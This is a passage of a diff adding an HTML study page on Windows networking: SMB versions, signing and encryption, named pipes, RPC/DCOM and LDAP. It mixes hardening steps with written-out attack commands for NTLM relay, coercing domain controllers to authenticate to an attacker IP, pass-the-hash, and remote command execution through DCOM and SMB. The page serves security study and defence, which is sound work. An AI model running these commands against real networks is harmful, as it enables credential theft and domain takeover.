@@ -1,0 +1,1876 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Networking</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+  <h1>Windows Networking &amp; Protocols</h1>
+
+  <!-- Tab Navigation -->
+  <ul class="nav nav-tabs" id="mainTabs" role="tablist">
+    <li class="nav-item" role="presentation">
+      <button class="nav-link active" id="notes-tab" data-bs-toggle="tab" data-bs-target="#notes" type="button" role="tab" aria-controls="notes" aria-selected="true">Notes</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="lab-tab" data-bs-toggle="tab" data-bs-target="#lab" type="button" role="tab" aria-controls="lab" aria-selected="false">Labs</button>
+    </li>
+    <li class="nav-item" role="presentation">
+      <button class="nav-link" id="ctf-tab" data-bs-toggle="tab" data-bs-target="#ctf" type="button" role="tab" aria-controls="ctf" aria-selected="false">CTF Challenges</button>
+    </li>
+  </ul>
+
+  <!-- Tab Content -->
+  <div class="tab-content" id="mainTabContent">
+
+    <!-- ==================== NOTES TAB ==================== -->
+    <div class="tab-pane fade show active" id="notes" role="tabpanel" aria-labelledby="notes-tab">
+
+      <!-- ===== SMB ===== -->
+      <h2>SMB (Server Message Block)</h2>
+
+      <h3>SMB Version History &amp; Feature Comparison</h3>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr>
+            <th>Version</th>
+            <th>Introduced</th>
+            <th>Key Features</th>
+            <th>Security</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>SMB 1.0 / CIFS</td>
+            <td>Windows 2000 / NT 4.0</td>
+            <td>Opportunistic locking, large file support, direct TCP transport (445)</td>
+            <td>No encryption, optional signing. Vulnerable to EternalBlue (MS17-010), relay attacks. <strong>Deprecated — disable everywhere.</strong></td>
+          </tr>
+          <tr>
+            <td>SMB 2.0</td>
+            <td>Windows Vista / Server 2008</td>
+            <td>Reduced chattiness (compound commands), larger reads/writes, durable handles, symbolic link support</td>
+            <td>HMAC-SHA256 signing, no encryption</td>
+          </tr>
+          <tr>
+            <td>SMB 2.1</td>
+            <td>Windows 7 / Server 2008 R2</td>
+            <td>Client oplock leasing, large MTU support, energy efficiency improvements</td>
+            <td>Same as 2.0</td>
+          </tr>
+          <tr>
+            <td>SMB 3.0</td>
+            <td>Windows 8 / Server 2012</td>
+            <td>Multichannel, SMB Direct (RDMA), transparent failover, witness service, VSS remote file snapshots</td>
+            <td><strong>AES-128-CCM encryption</strong>, secure dialect negotiation</td>
+          </tr>
+          <tr>
+            <td>SMB 3.0.2</td>
+            <td>Windows 8.1 / Server 2012 R2</td>
+            <td>Automatic session rebalancing, improved scale-out performance</td>
+            <td>Same as 3.0</td>
+          </tr>
+          <tr>
+            <td>SMB 3.1.1</td>
+            <td>Windows 10 / Server 2016+</td>
+            <td>Pre-authentication integrity (SHA-512 hash chain), cluster dialect fencing</td>
+            <td><strong>AES-128-GCM/AES-256-GCM encryption</strong>, pre-auth integrity prevents downgrade, mandatory secure negotiate</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>SMB Authentication</h3>
+      <p>SMB supports multiple authentication mechanisms through the SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) framework:</p>
+      <ul>
+        <li><strong>NTLM Authentication:</strong> Challenge-response mechanism. Server sends a challenge, client responds with NTHash-derived response. Susceptible to relay and cracking attacks.</li>
+        <li><strong>Kerberos Authentication:</strong> Ticket-based. Client obtains TGT from KDC, then requests service ticket for the target SPN (e.g., <code>cifs/fileserver.domain.local</code>). Preferred in domain environments.</li>
+        <li><strong>Anonymous Access:</strong> Null session — no credentials. Uses IPC$ for certain enumeration. Largely restricted in modern Windows but still present in misconfigured environments.</li>
+        <li><strong>Guest Access:</strong> Disabled by default on Server 2019+. When enabled, failed auth may fall back to guest, granting read access to shares configured for "Everyone".</li>
+      </ul>
+
+      <h4>NTLM Authentication Flow (SMB Context)</h4>
+      <pre><code class="language-bash"># NTLM Type Messages in SMB:
+# 1. Client → Server: SMB_COM_SESSION_SETUP (NTLMSSP_NEGOTIATE)
+#    Contains: Flags, domain, workstation name
+# 2. Server → Client: SMB_COM_SESSION_SETUP response (NTLMSSP_CHALLENGE)
+#    Contains: Server challenge (8 bytes), target info, flags
+# 3. Client → Server: SMB_COM_SESSION_SETUP (NTLMSSP_AUTH)
+#    Contains: LM/NT response, domain, username, workstation
+#    NTLMv2: HMAC-MD5(NTHash, uppercase(user)+domain) → key
+#    Response = HMAC-MD5(key, server_challenge + client_blob)</code></pre>
+
+      <h3>SMB Signing</h3>
+      <p>SMB signing provides message integrity. Each packet includes a signature (HMAC over packet content using the session key). Critical for preventing relay attacks.</p>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Setting</th><th>Registry Path</th><th>Default (Workstation)</th><th>Default (DC)</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Digitally sign communications (always)</td>
+            <td><code>HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\RequireSecuritySignature</code></td>
+            <td>0 (Disabled)</td>
+            <td><strong>1 (Enabled)</strong></td>
+          </tr>
+          <tr>
+            <td>Digitally sign communications (if client agrees)</td>
+            <td><code>HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\EnableSecuritySignature</code></td>
+            <td>1 (Enabled)</td>
+            <td>1 (Enabled)</td>
+          </tr>
+        </tbody>
+      </table>
+      <p><strong>Impact on Relay:</strong> If signing is NOT required, an attacker can intercept NTLM auth and relay it to another target. The relayed session won't be signed because the attacker doesn't have the session key to compute valid signatures. When signing IS required, the target rejects unsigned messages, blocking relay.</p>
+
+      <pre><code class="language-powershell"># Check SMB signing requirements across domain
+# CrackMapExec method:
+crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+
+# PowerShell - check local signing config
+Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature
+
+# Force SMB signing via GPO:
+# Computer Config → Policies → Windows Settings → Security Settings
+# → Local Policies → Security Options
+# "Microsoft network server: Digitally sign communications (always)" = Enabled</code></pre>
+
+      <h3>SMB Encryption</h3>
+      <p>Available in SMB 3.0+. Encrypts all data in transit using AES. Can be configured per-share or server-wide.</p>
+      <pre><code class="language-powershell"># Enable encryption on a specific share
+Set-SmbShare -Name "SecretShare" -EncryptData $true
+
+# Enable server-wide encryption (all shares)
+Set-SmbServerConfiguration -EncryptData $true
+
+# Reject unencrypted connections globally
+Set-SmbServerConfiguration -RejectUnencryptedAccess $true
+
+# Check encryption status
+Get-SmbShare | Select-Object Name, EncryptData, CurrentUsers
+
+# SMB 3.1.1 encryption algorithms (Windows Server 2022+)
+Set-SmbServerConfiguration -AesCcmEncryptionEnabled $false  # Disable CCM
+Set-SmbServerConfiguration -AesGcmEncryptionEnabled $true   # Prefer GCM</code></pre>
+
+      <h3>Administrative Shares</h3>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Share</th><th>Path</th><th>Purpose</th><th>Access Required</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>C$</td><td>C:\</td><td>Root of system drive</td><td>Local admin or domain admin</td></tr>
+          <tr><td>ADMIN$</td><td>C:\Windows</td><td>Remote admin (used by PsExec, WMI)</td><td>Local admin or domain admin</td></tr>
+          <tr><td>IPC$</td><td>N/A (inter-process)</td><td>Named pipes, null sessions, RPC</td><td>Authenticated users (limited anon)</td></tr>
+          <tr><td>PRINT$</td><td>C:\Windows\System32\spool\drivers</td><td>Printer drivers</td><td>Varies</td></tr>
+          <tr><td>NETLOGON</td><td>%SystemRoot%\sysvol\domain\Scripts</td><td>Login scripts (DCs only)</td><td>Authenticated users (read)</td></tr>
+          <tr><td>SYSVOL</td><td>%SystemRoot%\sysvol\sysvol</td><td>GPOs, scripts (DCs only)</td><td>Authenticated users (read)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Named Pipes over SMB</h3>
+      <p>Named pipes are endpoints for IPC. Over the network, they are accessed via IPC$ share: <code>\\server\IPC$\pipename</code>. Many critical Windows services expose RPC interfaces over named pipes:</p>
+      <ul>
+        <li><code>\pipe\spoolss</code> — Print Spooler (MS-RPRN, abused by PrinterBug)</li>
+        <li><code>\pipe\efsrpc</code> — Encrypting File System (MS-EFSR, abused by PetitPotam)</li>
+        <li><code>\pipe\netlogon</code> — Netlogon service (MS-NRPC)</li>
+        <li><code>\pipe\samr</code> — SAM Remote (user enumeration)</li>
+        <li><code>\pipe\lsarpc</code> — LSA Remote (SID/name translation, policy info)</li>
+        <li><code>\pipe\svcctl</code> — Service Control Manager (PsExec uses this)</li>
+        <li><code>\pipe\atsvc</code> — Task Scheduler</li>
+        <li><code>\pipe\winreg</code> — Remote Registry</li>
+      </ul>
+
+      <pre><code class="language-powershell"># Enumerate named pipes on local system
+Get-ChildItem \\.\pipe\ | Select-Object Name
+
+# Enumerate named pipes on remote system (requires access to IPC$)
+# Using Impacket's pipe_auditor
+python3 pipe_auditor.py domain/user:password@target
+
+# List pipes via CrackMapExec
+crackmapexec smb target -u user -p pass --pipes</code></pre>
+
+      <h3>SMB Relay Attacks</h3>
+      <p>When SMB signing is not required, an attacker can relay captured NTLM authentication to other services. The attacker acts as a man-in-the-middle: victim authenticates to attacker, attacker forwards those credentials to the target.</p>
+
+      <h4>ntlmrelayx — Multi-Protocol Relay</h4>
+      <pre><code class="language-bash"># Basic SMB → SMB relay (executes command on target)
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+
+# SMB → SMB relay with interactive shell
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+# Then connect: nc 127.0.0.1 11000
+
+# SMB → LDAP relay (add computer account for RBCD)
+impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access
+
+# SMB → LDAP relay (shadow credentials)
+impacket-ntlmrelayx -t ldap://dc01.corp.local --shadow-credentials --shadow-target victim$
+
+# SMB → HTTP (ADCS web enrollment - ESC8)
+impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+
+# SMB → MSSQL relay
+impacket-ntlmrelayx -t mssql://sqlserver.corp.local -q "SELECT SYSTEM_USER"
+
+# Multi-target relay with SOCKS proxy
+impacket-ntlmrelayx -tf targets.txt -smb2support -socks
+# Use proxychains with the SOCKS port to access relayed sessions</code></pre>
+
+      <h4>Relay Attack Requirements</h4>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Relay Target</th><th>Port</th><th>Signing Required?</th><th>Notes</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>SMB</td><td>445</td><td>Only on DCs by default</td><td>Most common relay target. Need local admin for code exec.</td></tr>
+          <tr><td>LDAP</td><td>389/636</td><td>Not by default</td><td>Can modify AD objects. Powerful for RBCD/shadow credentials.</td></tr>
+          <tr><td>LDAPS</td><td>636</td><td>Channel binding (if enforced)</td><td>TLS channel binding blocks relay when enforced.</td></tr>
+          <tr><td>HTTP/HTTPS</td><td>80/443</td><td>No (typically)</td><td>ADCS web enrollment, Exchange, WSUS.</td></tr>
+          <tr><td>MSSQL</td><td>1433</td><td>No</td><td>Execute queries as relayed user.</td></tr>
+          <tr><td>IMAP</td><td>143</td><td>No</td><td>Access mailbox of relayed user.</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Coercing SMB Authentication</h3>
+      <p>These techniques force a target machine to authenticate to an attacker-controlled listener, providing NTLM credentials for relay or cracking.</p>
+
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Technique</th><th>Protocol/Interface</th><th>Tool</th><th>Requirement</th><th>Patched?</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>PrinterBug / SpoolSample</td>
+            <td>MS-RPRN (Print Spooler)</td>
+            <td>SpoolSample.exe, printerbug.py</td>
+            <td>Any authenticated domain user; Spooler service running</td>
+            <td>No (by design)</td>
+          </tr>
+          <tr>
+            <td>PetitPotam</td>
+            <td>MS-EFSR (EFS RPC)</td>
+            <td>PetitPotam.py</td>
+            <td>Unauthenticated (pre-patch) or authenticated</td>
+            <td>Partially (unauthenticated blocked)</td>
+          </tr>
+          <tr>
+            <td>DFSCoerce</td>
+            <td>MS-DFSNM (DFS)</td>
+            <td>DFSCoerce.py</td>
+            <td>Authenticated domain user</td>
+            <td>Partially</td>
+          </tr>
+          <tr>
+            <td>ShadowCoerce</td>
+            <td>MS-FSRVP (File Server VSS Agent)</td>
+            <td>ShadowCoerce.py</td>
+            <td>Authenticated; FSRVP service running</td>
+            <td>Partially</td>
+          </tr>
+          <tr>
+            <td>PrivExchange</td>
+            <td>Exchange EWS (PushSubscription)</td>
+            <td>privexchange.py</td>
+            <td>Exchange mailbox credentials</td>
+            <td>Yes (Feb 2019 CU)</td>
+          </tr>
+          <tr>
+            <td>Coercer (multi)</td>
+            <td>Multiple RPC interfaces</td>
+            <td>Coercer.py</td>
+            <td>Authenticated; scans for all known coercion methods</td>
+            <td>Varies</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <pre><code class="language-bash"># PrinterBug - force DC to authenticate to attacker
+python3 printerbug.py domain/user:password@dc01.corp.local attacker_ip
+
+# PetitPotam - unauthenticated coercion (pre-patch)
+python3 PetitPotam.py attacker_ip dc01.corp.local
+
+# PetitPotam - authenticated
+python3 PetitPotam.py -u user -p password -d corp.local attacker_ip dc01.corp.local
+
+# DFSCoerce
+python3 DFSCoerce.py -u user -p password -d corp.local attacker_ip dc01.corp.local
+
+# ShadowCoerce
+python3 ShadowCoerce.py -u user -p password -d corp.local attacker_ip target.corp.local
+
+# Coercer - scan for all available methods
+python3 Coercer.py scan -u user -p password -d corp.local -t dc01.corp.local
+python3 Coercer.py coerce -u user -p password -d corp.local -t dc01.corp.local -l attacker_ip</code></pre>
+
+      <h3>SMB Enumeration Tools</h3>
+      <pre><code class="language-bash"># === smbclient (Impacket) ===
+# List shares
+smbclient -L //target -U 'domain\user%password'
+# Connect to share
+smbclient //target/sharename -U 'domain\user%password'
+# Recursive listing
+smbclient //target/share -U user%pass -c 'recurse; ls'
+
+# === CrackMapExec / NetExec ===
+# Enumerate shares
+crackmapexec smb target -u user -p pass --shares
+# Spider shares for sensitive files
+crackmapexec smb target -u user -p pass -M spider_plus
+# Check if user is local admin
+crackmapexec smb target -u user -p pass
+# Enumerate logged-on users
+crackmapexec smb target -u user -p pass --loggedon-users
+# Pass-the-hash
+crackmapexec smb target -u user -H NTHASH --shares
+
+# === enum4linux-ng (Python rewrite) ===
+enum4linux-ng -A target                        # Full enumeration
+enum4linux-ng -u user -p pass -oA output target  # Authenticated
+enum4linux-ng -R target                        # RID cycling
+
+# === smbmap ===
+smbmap -H target -u user -p pass              # List shares w/ permissions
+smbmap -H target -u user -p pass -r 'C$'     # Recursive list admin share
+smbmap -H target -u user -p pass --download 'C$\file.txt'
+smbmap -H target -u user -p pass -x 'whoami' # Execute command
+
+# === Sensitive file discovery ===
+# Snaffler (automated share hunting)
+Snaffler.exe -s -d corp.local -o snaffler_output.log
+# ManSpider
+python3 manspider.py target -u user -p pass -f '.config' -e xml,ini,conf</code></pre>
+
+      <h3>SMB Hardening</h3>
+      <pre><code class="language-powershell"># Disable SMBv1
+Set-SmbServerConfiguration -EnableSMB1Protocol $false
+Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
+
+# Require SMB signing (server)
+Set-SmbServerConfiguration -RequireSecuritySignature $true
+
+# Require SMB signing (client)
+Set-SmbClientConfiguration -RequireSecuritySignature $true
+
+# Enable SMB encryption server-wide
+Set-SmbServerConfiguration -EncryptData $true
+Set-SmbServerConfiguration -RejectUnencryptedAccess $true
+
+# Restrict null session access
+# Registry: HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" `
+  -Name "RestrictNullSessAccess" -Value 1
+
+# Disable administrative shares (workstations)
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" `
+  -Name "AutoShareWks" -Value 0</code></pre>
+
+      <hr>
+
+      <!-- ===== RPC/DCOM ===== -->
+      <h2>RPC / DCOM</h2>
+
+      <h3>RPC Architecture</h3>
+      <p>Microsoft RPC (MS-RPC) is the backbone of Windows remote management. Built on DCE/RPC, it uses NDR (Network Data Representation) for marshaling.</p>
+      <ul>
+        <li><strong>Endpoint Mapper (EPM):</strong> TCP port 135. Maps RPC interface UUIDs to dynamic port numbers. Queried by clients before connecting to the actual service.</li>
+        <li><strong>Dynamic Ports:</strong> By default 49152-65535 (Windows Server 2008+). Configurable via registry or firewall rules.</li>
+        <li><strong>Transports:</strong> TCP (ncacn_ip_tcp), Named Pipes over SMB (ncacn_np), HTTP (ncacn_http — RPC over HTTP/RPC Proxy).</li>
+      </ul>
+
+      <h4>RPC Connection Flow</h4>
+      <pre><code class="language-bash"># 1. Client queries Endpoint Mapper on target:135
+#    "What port is interface UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa?"
+# 2. EPM responds with dynamic port (e.g., 49667)
+# 3. Client connects to target:49667 for actual RPC calls
+# 4. Authentication occurs (NTLM/Kerberos via SPNEGO)</code></pre>
+
+      <h4>Named Pipes as RPC Transport</h4>
+      <p>Many RPC services are available over named pipes (ncacn_np transport), accessed via IPC$ share over SMB (port 445). This means firewall rules blocking port 135 won't prevent access if port 445 is open.</p>
+      <pre><code class="language-bash"># Format: ncacn_np:\\server[\pipe\pipename]
+# Examples:
+# \pipe\spoolss   → MS-RPRN (Print Spooler)
+# \pipe\efsrpc    → MS-EFSR (EFS)
+# \pipe\samr      → MS-SAMR (SAM)
+# \pipe\lsarpc    → MS-LSAR (LSA)
+# \pipe\netlogon  → MS-NRPC (Netlogon)
+# \pipe\svcctl    → MS-SCMR (Service Control Manager)
+# \pipe\atsvc     → MS-TSCH (Task Scheduler)
+# \pipe\drsuapi   → MS-DRSR (Directory Replication - DCSync!)</code></pre>
+
+      <h3>Critical RPC Interfaces</h3>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Interface</th><th>UUID</th><th>Purpose</th><th>Offensive Use</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>MS-DRSR (DRSUAPI)</td><td>e3514235-4b06-11d1-ab04-00c04fc2dcd2</td><td>AD replication</td><td>DCSync — extract all password hashes from DC</td></tr>
+          <tr><td>MS-RPRN</td><td>12345678-1234-abcd-ef00-0123456789ab</td><td>Print Spooler</td><td>PrinterBug coercion, PrintNightmare (CVE-2021-34527)</td></tr>
+          <tr><td>MS-EFSR</td><td>c681d488-d850-11d0-8c52-00c04fd90f7e</td><td>Encrypting File System</td><td>PetitPotam coercion</td></tr>
+          <tr><td>MS-SCMR</td><td>367abb81-9844-35f1-ad32-98f038001003</td><td>Service Control Manager</td><td>Remote service creation (PsExec-style)</td></tr>
+          <tr><td>MS-SAMR</td><td>12345778-1234-abcd-ef00-0123456789ac</td><td>SAM database access</td><td>User/group enumeration, password changes</td></tr>
+          <tr><td>MS-NRPC</td><td>12345678-1234-abcd-ef00-01234567cffb</td><td>Netlogon</td><td>ZeroLogon (CVE-2020-1472)</td></tr>
+          <tr><td>MS-TSCH</td><td>86d35949-83c9-4044-b424-db363231fd0c</td><td>Task Scheduler</td><td>Remote task creation for lateral movement</td></tr>
+          <tr><td>MS-DFSNM</td><td>4fc742e0-4a10-11cf-8273-00aa004ae673</td><td>DFS management</td><td>DFSCoerce authentication coercion</td></tr>
+        </tbody>
+      </table>
+
+      <h3>RPC Enumeration</h3>
+      <pre><code class="language-bash"># === rpcclient (Samba) ===
+rpcclient -U 'domain\user%password' target
+rpcclient $> srvinfo           # Server info
+rpcclient $> enumdomusers      # Enumerate domain users
+rpcclient $> enumdomgroups     # Enumerate domain groups
+rpcclient $> queryuser 0x1f4   # Query user by RID (500=Admin)
+rpcclient $> getdompwinfo      # Password policy
+rpcclient $> enumprivs         # Enumerate privileges
+rpcclient $> lsaenumsid        # Enumerate SIDs
+rpcclient $> lookupnames admin # Name → SID
+rpcclient $> lookupsids S-1-5-21-...-500  # SID → Name
+
+# Null session enumeration
+rpcclient -U '' -N target
+
+# === rpcmap (Impacket) ===
+# Enumerate all RPC interfaces on endpoint mapper
+impacket-rpcmap ncacn_ip_tcp:target
+impacket-rpcmap ncacn_np:target[\pipe\spoolss]
+
+# === rpcdump (Impacket) ===
+# Dump registered RPC endpoints
+impacket-rpcdump target
+impacket-rpcdump -port 135 target
+
+# Check if specific interface is available
+impacket-rpcdump target | grep -i "MS-RPRN\|MS-EFSR\|MS-DFSNM"</code></pre>
+
+      <h3>DCOM (Distributed Component Object Model)</h3>
+      <p>DCOM extends COM for remote activation. Objects are identified by CLSIDs and activated via the DCOM Service Control Manager (OLE/COM Object Viewer). Uses RPC endpoint mapper (135) and dynamic ports.</p>
+
+      <h4>DCOM Lateral Movement</h4>
+      <pre><code class="language-powershell"># MMC20.Application (CLSID: 49B2791A-B1AE-4C90-9B8E-E860BA07F889)
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
+
+# ShellWindows (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
+$item = $com.Item()
+$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\output.txt","","",0)
+
+# ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880)
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target"))
+$com.Document.Application.ShellExecute("cmd.exe","/c whoami","","",0)
+
+# Excel.Application (requires Office installed)
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
+$com.DisplayAlerts = $false
+$com.DDEInitiate("cmd","/c whoami")</code></pre>
+
+      <pre><code class="language-bash"># Impacket dcomexec
+impacket-dcomexec domain/user:password@target 'whoami' -object MMC20
+impacket-dcomexec domain/user:password@target 'whoami' -object ShellWindows
+impacket-dcomexec domain/user:password@target 'whoami' -object ShellBrowserWindow</code></pre>
+
+      <hr>
+
+      <!-- ===== LDAP ===== -->
+      <h2>LDAP (Lightweight Directory Access Protocol)</h2>
+
+      <h3>LDAP Basics</h3>
+      <table class="table table-bordered table-dark table-striped">
+        <thead>
+          <tr><th>Port</th><th>Protocol</th><th>Description</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>389</td><td>LDAP</td><td>Cleartext LDAP (or STARTTLS upgrade)</td></tr>
+          <tr><td>636</td><td>LDAPS</td><td>LDAP over TLS (implicit TLS)</td></tr>
+          <tr><td>3268</td><td>GC</td><td>Global Catalog (forest-wide, partial attribute set)</td></tr>
+          <tr><td>3269</td><td>GC-SSL</td><td>Global Catalog over TLS</td></tr>
+        </tbody>
+      </table>
+
+      <h4>LDAP Bind Types</h4>
+      <ul>
+        <li><strong>Simple Bind:</strong> Username + plaintext password. Insecure unless over TLS.</li>
+        <li><strong>SASL Bind:</strong> Supports GSSAPI (Kerberos), DIGEST-MD5, NTLM. Preferred for domain-joined machines.</li>
+        <li><strong>Anonymous Bind:</strong> No credentials. Very restricted on modern AD (default: rootDSE only).</li>
+        <li><strong>Unauthenticated Bind:</strong> DN provided but empty password. Treated as anonymous by default.</li>
+      </ul>
+
+      <h3>LDAP Filter Syntax</h3>
+      <pre><code class="language-bash"># Basic operators
+# = (equality), ~= (approx), >= (gte), <= (lte), * (wildcard/presence)
+# & (AND), | (OR), ! (NOT)
+
+# All users
+(objectClass=user)
+
+# All computer accounts
+(objectClass=computer)
+
+# Users with SPN set (Kerberoastable)
+(&amp;(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))
+
+# Unconstrained delegation computers
+(&amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))
+
+# Users with "password never expires"
+(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
+
+# AdminCount=1 (privileged accounts)
+(&amp;(objectClass=user)(adminCount=1))
+
+# ASREPRoastable users (no preauth required)
+(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+
+# Groups with "Domain Admins" in name
+(&amp;(objectClass=group)(cn=*Domain Admins*))
+
+# All GPOs
+(objectClass=groupPolicyContainer)
+
+# Accounts with constrained delegation
+(&amp;(objectClass=user)(msDS-AllowedToDelegateTo=*))
+
+# LAPS passwords (if readable)
+(&amp;(objectClass=computer)(ms-MCS-AdmPwd=*))</code></pre>
+
+      <h3>LDAP Enumeration Tools</h3>
+      <pre><code class="language-bash"># === ldapsearch ===
+# Bind and search for all users
+ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName
+
+# Anonymous rootDSE query (get naming contexts, domain functional level)
+ldapsearch -x -H ldap://dc01.corp.local -b "" -s base "(objectClass=*)" \
+  defaultNamingContext dnsHostName domainFunctionality
+
+# Kerberoastable users
+ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w pass \
+  -b "DC=corp,DC=local" "(&amp;(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))" \
+  sAMAccountName servicePrincipalName
+
+# === ldapdomaindump ===
+ldapdomaindump -u 'corp.local\user' -p 'Password123' dc01.corp.local
+# Produces: domain_users.html, domain_computers.html, domain_groups.html, etc.
+
+# === PowerView (PowerShell) ===
+Import-Module PowerView.ps1
+Get-DomainUser -SPN                          # Kerberoastable
+Get-DomainUser -AdminCount                   # Privileged accounts
+Get-DomainComputer -Unconstrained            # Unconstrained delegation
+Get-DomainGPO | Select-Object displayName, gpcFileSysPath
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+Find-InterestingDomainShareFile              # Sensitive files on shares
+
+# === ADExplorer (Sysinternals) ===
+# GUI LDAP browser - connect to DC and explore tree
+# Can take snapshots for offline analysis
+# Compare snapshots to detect AD changes</code></pre>
+
+      <h3>LDAP Signing &amp; Channel Binding</h3>
+      <p>LDAP signing ensures message integrity. Channel binding ties the LDAP session to the TLS channel, preventing relay attacks even over LDAPS.</p>
+      <pre><code class="language-powershell"># Check LDAP signing requirement on DC
+# Registry: HKLM\System\CurrentControlSet\Services\NTDS\Parameters
+# LDAPServerIntegrity: 0=None, 1=Negotiate(default), 2=Required
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name LDAPServerIntegrity
+
+# Enforce LDAP signing via GPO
+# Computer Config → Policies → Windows Settings → Security Settings
+# → Local Policies → Security Options
+# "Domain controller: LDAP server signing requirements" = Require signing
+
+# Check channel binding
+# LdapEnforceChannelBinding: 0=Never, 1=When supported, 2=Always
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name LdapEnforceChannelBinding
+
+# Test if LDAP signing is enforced (from Linux)
+crackmapexec ldap dc01.corp.local -u user -p pass -M ldap-checker</code></pre>
+
+      <h4>LDAP Relay Attacks</h4>
+      <p>When LDAP signing is NOT enforced (default "Negotiate" level), relayed NTLM auth can bind to LDAP and modify AD objects:</p>
+      <pre><code class="language-bash"># Relay to LDAP - set RBCD (Resource-Based Constrained Delegation)
+# Attacker adds msDS-AllowedToActOnBehalfOfOtherIdentity pointing to controlled account
+impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access --escalate-user controlled_user$
+
+# Relay to LDAP - add shadow credentials (msDS-KeyCredentialLink)
+impacket-ntlmrelayx -t ldap://dc01.corp.local --shadow-credentials --shadow-target dc01$
+
+# Relay to LDAP - modify ACLs
+impacket-ntlmrelayx -t ldap://dc01.corp.local --escalate-user attacker
+
+# Note: Channel binding on LDAPS blocks relay even without signing enforcement
+# Note: LDAP relay requires the relayed account to have write permissions on target object</code></pre>
+
+      <h3>Active Directory Certificate Services via LDAP</h3>
+      <pre><code class="language-bash"># Find ADCS enrollment services via LDAP
+ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w pass \
